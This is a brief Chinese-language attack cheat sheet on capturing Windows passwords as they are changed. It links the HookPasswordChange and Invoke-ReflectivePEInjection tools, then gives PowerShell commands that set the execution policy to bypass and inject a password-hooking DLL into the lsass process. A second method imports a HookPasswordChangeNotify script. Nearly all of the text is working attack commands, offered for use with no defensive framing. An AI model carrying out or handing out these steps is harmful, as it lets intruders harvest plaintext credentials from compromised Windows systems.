## Method 1
```bash
# 下载
https://github.com/clymb3r/Misc-Windows-Hacking
https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
#使用 Visual Studio Install 编译
```
使用静态库编译


将编译后的文件上传后执行
```powershell
Set-ExecutionPolicy bypass
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
```
## Method 2
```powershell
# 下载
https://github.com/kevien/PasswordchangeNotify/blob/master/HookPasswordChangeNotify.ps1
Set-ExecutionPolicy bypass
Import-Module .\HookPasswordChangeNotify.ps1
```
